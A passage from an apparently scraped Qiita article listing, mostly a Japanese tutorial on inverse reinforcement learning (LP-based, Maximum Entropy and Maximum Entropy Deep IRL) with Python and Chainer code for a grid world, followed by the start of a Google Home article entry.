                    <span class="p">[</span><span class="n">eye_ss</span><span class="p">,</span> <span class="n">zero_ss</span><span class="p">,</span> <span class="o">-</span><span class="n">eye_ss</span><span class="p">],</span>   <span class="c1"># R &lt;= u</span>
                    <span class="p">[</span><span class="o">-</span><span class="n">eye_ss</span><span class="p">,</span> <span class="n">zero_ss</span><span class="p">,</span> <span class="n">zero_ss</span><span class="p">],</span>  <span class="c1"># -R &lt;= Rmax</span>
                    <span class="p">[</span><span class="n">eye_ss</span><span class="p">,</span> <span class="n">zero_ss</span><span class="p">,</span> <span class="n">zero_ss</span><span class="p">]])</span>  <span class="c1"># R &lt;= Rmax</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">vstack</span><span class="p">([</span><span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">n_states</span> <span class="o">*</span> <span class="p">(</span><span class="n">n_actions</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">n_states</span><span class="p">,</span> <span class="mi">1</span><span class="p">)),</span>
                   <span class="n">Rmax</span> <span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="mi">2</span> <span class="o">*</span> <span class="n">n_states</span><span class="p">,</span> <span class="mi">1</span><span class="p">))])</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">linprog</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">A_ub</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">results</span><span class="p">[</span><span class="s2">"x"</span><span class="p">][:</span><span class="n">n_states</span><span class="p">]</span>
</pre></div></div>

<p>この関数を使って、線形計画法によって得られる報酬マップを求めてみます。関数の引数<code>trans_probs</code>は状態遷移確率を示しておりGrid環境内にあるメンバ変数<code>P</code>から求めることができます。<code>policy</code>は上の価値反復法から求めた最適方策を用います。<br>
実際に推定した結果を描画したものが下図になります。正解は上の報酬マップのように左上と右下のみに色が付けば良いですが、それなりに推定できているようです。</p>

<p><a href="https://camo.qiitausercontent.com/b8d322d366bdac9879a0ed17bafa69651685ff44/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f33656132613761632d323334342d633534372d313562362d6234353233353061346261632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b8d322d366bdac9879a0ed17bafa69651685ff44/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f33656132613761632d323334342d633534372d313562362d6234353233353061346261632e706e67" alt="lp_irl.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/14516/3ea2a7ac-2344-c547-15b6-b452350a4bac.png"></a></p>

<h2>
<span id="maximum-entropy-irl" class="fragment"></span><a href="#maximum-entropy-irl"><i class="fa fa-link"></i></a>Maximum Entropy IRL</h2>

<p>Maximum Entropy IRLでは報酬関数$r(s)$をパラメタ$\theta$を用いて以下のような線形関数で近似します。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>r_{\theta}(s) = {\theta}^T\phi(s)
</pre></div></div>

<p>ここで$\phi(s) \in R^{|S|}$は特徴ベクトルといって、状態$s$を表現する特徴量です。今回は単純にone-hotベクトルを用います。<br>
このときMaximum Entropy IRLでは熟練者は以下のような確率で経路$\zeta=[(s_0, a_0),(s_1, a_1),...,(s_T, a_T)]$を選択していると仮定します。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>P(\zeta |\theta ) = \frac{\exp{(R_{\theta}(\zeta ))}}{Z}
</pre></div></div>

<p>ここで、</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>R_{\theta}(\zeta ) = \sum_t r_{\theta}(s_t) \\
Z=\sum_{\zeta} \exp{(R_{\theta}(\zeta ))}
</pre></div></div>

<p>上式を用いて最適な$N$個の行動列$D=[ {\zeta}^{(0)} , {\zeta}^{(1)} ,..., {\zeta}^{(N)} ]$が与えられた際に、以下の対数尤度関数$L(\theta)$を最大にする$\theta$を求めることで報酬関数を推定します。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>L(\theta) = -\sum_i \log P({\zeta}^{(i)}| \theta )
</pre></div></div>

<p>尤度最大化を行うために$L(\theta)$の勾配を求めます。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>L(\theta) = -\sum_i \log \frac{\exp{(R_{\theta}({\zeta}^{(i)} ))}}{Z} =  \sum_i R_{\theta}({\zeta}^{(i)} ) - N \log{Z} =  \sum_i R_{\theta}({\zeta}^{(i)} ) - N \log \sum_i \exp{(R_{\theta}({\zeta}^{(i)}))} \\
\begin{eqnarray}
{\nabla}_{\theta} L(\theta) &amp;=&amp; \sum_i \frac{dR_{\theta}({\zeta}^{(i)} )}{d\theta} - N \frac{1}{\sum_i \exp{(R_{\theta}({\zeta}^{(i)}))}} \sum_i \exp{(R_{\theta}({\zeta}^{(i)}))} \frac{dR_{\theta}({\zeta}^{(i)})}{d\theta} \\
&amp;=&amp; \sum_i \frac{dR_{\theta}({\zeta}^{(i)} )}{d\theta} - N \sum_i \frac{\exp{(R_{\theta}({\zeta}^{(i)}))}}{\sum_i \exp{(R_{\theta}({\zeta}^{(i)}))}} \frac{dR_{\theta}({\zeta}^{(i)})}{d\theta} \\
&amp;=&amp; \sum_i \frac{dR_{\theta}({\zeta}^{(i)} )}{d\theta} - N \sum_i P({\zeta}^{(i)}| \theta ) \frac{dR_{\theta}({\zeta}^{(i)})}{d\theta} \\
&amp;=&amp; \sum_s \frac{dr_{\theta}(s)}{d\theta} -N \sum_s p(s | \theta ) \frac{dr_{\theta}(s)}{d\theta}
\end{eqnarray}
</pre></div></div>

<p>ここで$p(s | \theta )$はstate visitation freqencyと呼ばれており、状態$s$を訪れた頻度を表しています。<br>
これらを踏まえて、Maximum Entropy IRLのコードは以下のようになります。</p>

<div class="code-frame" data-lang="py"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
<span class="kn">from</span> <span class="nn">value_iteration</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">expected_svf</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">trajs</span><span class="p">,</span> <span class="n">policy</span><span class="p">):</span>
    <span class="n">n_states</span><span class="p">,</span> <span class="n">n_actions</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">trans_probs</span><span class="o">.</span><span class="n">shape</span>
    <span class="n">n_t</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">trajs</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">mu</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">n_states</span><span class="p">,</span> <span class="n">n_t</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">traj</span> <span class="ow">in</span> <span class="n">trajs</span><span class="p">:</span>
        <span class="n">mu</span><span class="p">[</span><span class="n">traj</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">mu</span><span class="p">[:,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="p">[:,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">trajs</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">n_t</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_states</span><span class="p">):</span>
            <span class="n">mu</span><span class="p">[</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">]</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">([</span><span class="n">mu</span><span class="p">[</span><span class="n">pre_s</span><span class="p">,</span> <span class="n">t</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="n">trans_probs</span><span class="p">[</span><span class="n">pre_s</span><span class="p">,</span> <span class="n">policy</span><span class="p">[</span><span class="n">pre_s</span><span class="p">],</span> <span class="n">s</span><span class="p">]</span> <span class="k">for</span> <span class="n">pre_s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_states</span><span class="p">)])</span>
    <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">max_ent_irl</span><span class="p">(</span><span class="n">feature_matrix</span><span class="p">,</span> <span class="n">trans_probs</span><span class="p">,</span> <span class="n">trajs</span><span class="p">,</span>
                <span class="n">gamma</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span> <span class="n">n_epoch</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span> <span class="n">alpha</span><span class="o">=</span><span class="mf">0.5</span><span class="p">):</span>
    <span class="n">n_states</span><span class="p">,</span> <span class="n">d_states</span> <span class="o">=</span> <span class="n">feature_matrix</span><span class="o">.</span><span class="n">shape</span>
    <span class="n">_</span><span class="p">,</span> <span class="n">n_actions</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">trans_probs</span><span class="o">.</span><span class="n">shape</span>

    <span class="n">feature_exp</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">d_states</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">episode</span> <span class="ow">in</span> <span class="n">trajs</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">step</span> <span class="ow">in</span> <span class="n">episode</span><span class="p">:</span>
            <span class="n">feature_exp</span> <span class="o">+=</span> <span class="n">feature_matrix</span><span class="p">[</span><span class="n">step</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="p">:]</span>
    <span class="n">feature_exp</span> <span class="o">=</span> <span class="n">feature_exp</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">trajs</span><span class="p">)</span>

    <span class="n">theta</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="p">(</span><span class="n">d_states</span><span class="p">,))</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_epoch</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">feature_matrix</span><span class="o">.</span><span class="n">dot</span><span class="p">(</span><span class="n">theta</span><span class="p">)</span>
        <span class="n">v</span> <span class="o">=</span> <span class="n">value_iteration</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">gamma</span><span class="p">)</span>
        <span class="n">pi</span> <span class="o">=</span> <span class="n">best_policy</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
        <span class="n">exp_svf</span> <span class="o">=</span> <span class="n">expected_svf</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">trajs</span><span class="p">,</span> <span class="n">pi</span><span class="p">)</span>
        <span class="n">grad</span> <span class="o">=</span> <span class="n">feature_exp</span> <span class="o">-</span> <span class="n">feature_matrix</span><span class="o">.</span><span class="n">T</span><span class="o">.</span><span class="n">dot</span><span class="p">(</span><span class="n">exp_svf</span><span class="p">)</span>
        <span class="n">theta</span> <span class="o">+=</span> <span class="n">alpha</span> <span class="o">*</span> <span class="n">grad</span>

    <span class="k">return</span> <span class="n">feature_matrix</span><span class="o">.</span><span class="n">dot</span><span class="p">(</span><span class="n">theta</span><span class="p">)</span>
</pre></div></div>

<p>Maximum Entropy IRLでは熟練者の経路が必要であり、上の関数の引数<code>trajs</code>がそれに当たります。<br>
熟練者による経路は最適方策を用いて以下のように計算するようにしました。</p>

<div class="code-frame" data-lang="py"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">generate_demons</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">policy</span><span class="p">,</span> <span class="n">n_trajs</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span> <span class="n">len_traj</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">trajs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_trajs</span><span class="p">):</span>
        <span class="n">episode</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">env</span><span class="o">.</span><span class="n">reset</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">len_traj</span><span class="p">):</span>
            <span class="n">cur_s</span> <span class="o">=</span> <span class="n">env</span><span class="o">.</span><span class="n">s</span>
            <span class="n">state</span><span class="p">,</span> <span class="n">reward</span><span class="p">,</span> <span class="n">done</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">env</span><span class="o">.</span><span class="n">step</span><span class="p">(</span><span class="n">policy</span><span class="p">[</span><span class="n">cur_s</span><span class="p">])</span>
            <span class="n">episode</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">cur_s</span><span class="p">,</span> <span class="n">policy</span><span class="p">[</span><span class="n">cur_s</span><span class="p">],</span> <span class="n">state</span><span class="p">))</span>
            <span class="k">if</span> <span class="n">done</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len_traj</span><span class="p">):</span>
                    <span class="n">episode</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">state</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">state</span><span class="p">))</span>
                <span class="k">break</span>
        <span class="n">trajs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">episode</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">trajs</span>
</pre></div></div>

<p>生成した経路を用いてMaximum Entropy IRLによって報酬を推定した結果が以下になります。</p>

<p><a href="https://camo.qiitausercontent.com/77d2eef62c53520f4c513e8d3f3137bc753f02d1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f36653466323765362d623039352d373837642d303039312d3765306133303765636234312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/77d2eef62c53520f4c513e8d3f3137bc753f02d1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f36653466323765362d623039352d373837642d303039312d3765306133303765636234312e706e67" alt="max_ent_irl.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/14516/6e4f27e6-b095-787d-0091-7e0a307ecb41.png"></a></p>

<p>こちらもまあまあ推定できています。LPを使った方法と違って、 <strong>実際の最適な方策まで分かってなくても熟練者からの軌道列のみを用いて推定できる</strong> のがメリットと言えます。</p>

<h2>
<span id="maximum-entropy-deep-irl" class="fragment"></span><a href="#maximum-entropy-deep-irl"><i class="fa fa-link"></i></a>Maximum Entropy Deep IRL</h2>

<p>Maximum Entropy IRLと深層学習を組み合わせた手法がこれになります。通常のMaximum Entropy IRLでは線形関数によって報酬関数$r(s)$を近似しましたが、これをニューラルネットで表現したものに置き換えます。<br>
ネットワークの更新のために、最適化を行う尤度関数を以下のように熟練者の経路による項と正則化項に分離します。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>L(\theta)=\log P(D, \theta|r) = \underbrace{\log P(D|r)}_{L_D} + \underbrace{\log P(\theta)}_{L_{\theta}}
</pre></div></div>

<p>この尤度関数の$L_D=\log P(D|r)$のパラメタ微分を求めて式変形することで、楽に勾配を求めることができます。<br>
式変形を少し端折りますが、実際には以下のような勾配を求めることになります。</p>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>\frac{\partial L_D(\theta)}{\partial \theta} = (\mu_D - E[\mu]) \frac{\partial r_{\theta}(s)}{\partial \theta}
</pre></div></div>

<p>ここで、上式の$\mu_D$は熟練者の経路から求めた状態頻度で、$E[\mu]$は状態頻度の期待値を表します。<br>
コードはほぼMaximum Entropy IRLと同じ形になります。報酬関数がニューラルネットに変更され、それに伴いパラメタ更新のところなどが変わっています。今回、深層学習部分の実装にはChainerを用いています。</p>

<div class="code-frame" data-lang="py"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
<span class="kn">import</span> <span class="nn">chainer</span>
<span class="kn">import</span> <span class="nn">chainer.links</span> <span class="kn">as</span> <span class="nn">L</span>
<span class="kn">import</span> <span class="nn">chainer.functions</span> <span class="kn">as</span> <span class="nn">F</span>
<span class="kn">from</span> <span class="nn">chainer</span> <span class="kn">import</span> <span class="n">optimizers</span>
<span class="kn">from</span> <span class="nn">value_iteration</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">max_ent_irl</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">class</span> <span class="nc">Reward</span><span class="p">(</span><span class="n">chainer</span><span class="o">.</span><span class="n">Chain</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">n_input</span><span class="p">,</span> <span class="n">n_hidden</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">(</span><span class="n">Reward</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span>
            <span class="n">l1</span><span class="o">=</span><span class="n">L</span><span class="o">.</span><span class="n">Linear</span><span class="p">(</span><span class="n">n_input</span><span class="p">,</span> <span class="n">n_hidden</span><span class="p">),</span>
            <span class="n">l2</span><span class="o">=</span><span class="n">L</span><span class="o">.</span><span class="n">Linear</span><span class="p">(</span><span class="n">n_hidden</span><span class="p">,</span> <span class="n">n_hidden</span><span class="p">),</span>
            <span class="n">l3</span><span class="o">=</span><span class="n">L</span><span class="o">.</span><span class="n">Linear</span><span class="p">(</span><span class="n">n_hidden</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="p">)</span>

    <span class="k">def</span> <span class="fm">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
        <span class="n">h1</span> <span class="o">=</span> <span class="n">F</span><span class="o">.</span><span class="n">relu</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">l1</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
        <span class="n">h2</span> <span class="o">=</span> <span class="n">F</span><span class="o">.</span><span class="n">relu</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">l2</span><span class="p">(</span><span class="n">h1</span><span class="p">))</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">l3</span><span class="p">(</span><span class="n">h2</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">max_ent_deep_irl</span><span class="p">(</span><span class="n">feature_matrix</span><span class="p">,</span> <span class="n">trans_probs</span><span class="p">,</span> <span class="n">trajs</span><span class="p">,</span>
                     <span class="n">gamma</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span> <span class="n">n_epoch</span><span class="o">=</span><span class="mi">30</span><span class="p">):</span>
    <span class="n">n_states</span><span class="p">,</span> <span class="n">d_states</span> <span class="o">=</span> <span class="n">feature_matrix</span><span class="o">.</span><span class="n">shape</span>
    <span class="n">_</span><span class="p">,</span> <span class="n">n_actions</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">trans_probs</span><span class="o">.</span><span class="n">shape</span>
    <span class="n">reward_func</span> <span class="o">=</span> <span class="n">Reward</span><span class="p">(</span><span class="n">d_states</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
    <span class="n">optimizer</span> <span class="o">=</span> <span class="n">optimizers</span><span class="o">.</span><span class="n">AdaGrad</span><span class="p">(</span><span class="n">lr</span><span class="o">=</span><span class="mf">0.01</span><span class="p">)</span>
    <span class="n">optimizer</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span><span class="n">reward_func</span><span class="p">)</span>
    <span class="n">optimizer</span><span class="o">.</span><span class="n">add_hook</span><span class="p">(</span><span class="n">chainer</span><span class="o">.</span><span class="n">optimizer</span><span class="o">.</span><span class="n">WeightDecay</span><span class="p">(</span><span class="mf">1e-4</span><span class="p">))</span>
    <span class="n">optimizer</span><span class="o">.</span><span class="n">add_hook</span><span class="p">(</span><span class="n">chainer</span><span class="o">.</span><span class="n">optimizer</span><span class="o">.</span><span class="n">GradientClipping</span><span class="p">(</span><span class="mf">100.0</span><span class="p">))</span>

    <span class="n">feature_exp</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">d_states</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">episode</span> <span class="ow">in</span> <span class="n">trajs</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">step</span> <span class="ow">in</span> <span class="n">episode</span><span class="p">:</span>
            <span class="n">feature_exp</span> <span class="o">+=</span> <span class="n">feature_matrix</span><span class="p">[</span><span class="n">step</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="p">:]</span>
    <span class="n">feature_exp</span> <span class="o">=</span> <span class="n">feature_exp</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">trajs</span><span class="p">)</span>

    <span class="n">fmat</span> <span class="o">=</span> <span class="n">chainer</span><span class="o">.</span><span class="n">Variable</span><span class="p">(</span><span class="n">feature_matrix</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float32</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n_epoch</span><span class="p">):</span>
        <span class="n">reward_func</span><span class="o">.</span><span class="n">zerograds</span><span class="p">()</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">reward_func</span><span class="p">(</span><span class="n">fmat</span><span class="p">)</span>
        <span class="n">v</span> <span class="o">=</span> <span class="n">value_iteration</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">reshape</span><span class="p">((</span><span class="n">n_states</span><span class="p">,)),</span> <span class="n">gamma</span><span class="p">)</span>
        <span class="n">pi</span> <span class="o">=</span> <span class="n">best_policy</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
        <span class="n">exp_svf</span> <span class="o">=</span> <span class="n">expected_svf</span><span class="p">(</span><span class="n">trans_probs</span><span class="p">,</span> <span class="n">trajs</span><span class="p">,</span> <span class="n">pi</span><span class="p">)</span>
        <span class="n">grad_r</span> <span class="o">=</span> <span class="n">feature_exp</span> <span class="o">-</span> <span class="n">exp_svf</span>
        <span class="n">r</span><span class="o">.</span><span class="n">grad</span> <span class="o">=</span> <span class="o">-</span><span class="n">grad_r</span><span class="o">.</span><span class="n">reshape</span><span class="p">((</span><span class="n">n_states</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float32</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">backward</span><span class="p">()</span>
        <span class="n">optimizer</span><span class="o">.</span><span class="n">update</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">reward_func</span><span class="p">(</span><span class="n">fmat</span><span class="p">)</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">reshape</span><span class="p">((</span><span class="n">n_states</span><span class="p">,))</span>
</pre></div></div>

<p>本来は尤度関数に正則化項を足す必要があるのですが、同じような効果があるWeight Decayに置き換えています。<br>
いろいろとチューニングしてみて思ったのは、最適化はAdamのほうが安定している気がしましたが、論文に基づいて今回はAdaGradのままで最適化しています。</p>

<p><a href="https://camo.qiitausercontent.com/19753159f157622f7ab5a6f2968d17cd8c0e47f9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f61363637663331352d666464392d343033372d626435662d6362613235626264656263362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/19753159f157622f7ab5a6f2968d17cd8c0e47f9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31343531362f61363637663331352d666464392d343033372d626435662d6362613235626264656263362e706e67" alt="max_ent_deep_irl.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/14516/a667f315-fdd9-4037-bd5f-cba25bbdebc6.png"></a></p>

<p>こちらも報酬マップが推定できているのがわかります。</p>

<h2>
<span id="感想" class="fragment"></span><a href="#%E6%84%9F%E6%83%B3"><i class="fa fa-link"></i></a>感想</h2>

<p>深層学習を使えば簡単に精度よく推定できるのかと思いましたが、それなりにチューニングは必要でした。<br>
論文だともっと複雑な報酬マップに対して、深層学習を使った手法だけが格段に推定できているので、今回の環境よりももっと複雑な環境でやってみると明らかな差が出るのかなと思いました。</p>

<h2>
<span id="発展応用" class="fragment"></span><a href="#%E7%99%BA%E5%B1%95%E5%BF%9C%E7%94%A8"><i class="fa fa-link"></i></a>発展・応用</h2>

<p>GANとの関連やロボットに応用したGuided Cost Learningなどの発展的内容にも注目していきたいです。</p>

<ul>
<li><a href="https://arxiv.org/abs/1611.03852" rel="nofollow noopener" target="_blank">A Connection between Generative Adversarial Networks, Inverse Reinforcement Learning, and Energy-Based Models</a></li>
<li><a href="https://arxiv.org/abs/1603.00448" rel="nofollow noopener" target="_blank">Guided Cost Learning</a></li>
</ul>

<h2>
<span id="使用したコード" class="fragment"></span><a href="#%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9F%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>使用したコード</h2>

<p>今回使用したコードはすべてgithubにあげています。<br>
<a href="https://github.com/neka-nat/inv_rl" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/neka-nat/inv_rl</a></p>

<h2>
<span id="参考文献" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><i class="fa fa-link"></i></a>参考文献</h2>

<ul>
<li><a href="https://www.slideshare.net/ohtaman/tensor-flow-63359654" rel="nofollow noopener" target="_blank">TensorFlowで逆強化学習</a></li>
<li><a href="http://www.morikita.co.jp/books/book/3034" rel="nofollow noopener" target="_blank">これからの強化学習</a></li>
<li><a href="http://ai.stanford.edu/%7Eang/papers/icml00-irl.pdf" rel="nofollow noopener" target="_blank">Algorithm for Inverse Reinforcement Learning</a></li>
<li><a href="https://www.aaai.org/Papers/AAAI/2008/AAAI08-227.pdf" rel="nofollow noopener" target="_blank">Maximum Entropy Inverse Reinforcement Learning</a></li>
<li><a href="https://arxiv.org/abs/1507.04888" rel="nofollow noopener" target="_blank">Maximum Entropy Deep Inverse Reinforcement Learning</a></li>
<li><a href="http://2boy.org/%7Eyuta/publications/tsuboi-jsice-rl.pdf" rel="nofollow noopener" target="_blank">自然言語処理における逆強化学習・模倣学習の適用</a></li>
<li><a href="http://people.eecs.berkeley.edu/%7Ecbfinn/_files/bootcamp_inverserl.pdf" rel="nofollow noopener" target="_blank">Inverse Reinforcement Learning</a></li>
<li><a href="https://github.com/stormmax/irl-imitation" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/stormmax/irl-imitation</a></li>
<li><a href="https://github.com/MatthewJA/Inverse-Reinforcement-Learning" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/MatthewJA/Inverse-Reinforcement-Learning</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">86位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>107</kbd>
		<a target="_blank" href="https://qiita.com/syarihu/items/53ea1a65f481f8121109">Actions on Googleでapi.aiを使ってGoogle Homeに何か言わせてみる</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-07<br />22:28:11</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/15663.html">syarihu</a>(19件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/15663/profile-images/1480854946">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[api.ai]</b> <b>[GoogleHome]</b> <b>[actionsongoogle]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>2017年11月22日追記: <br>
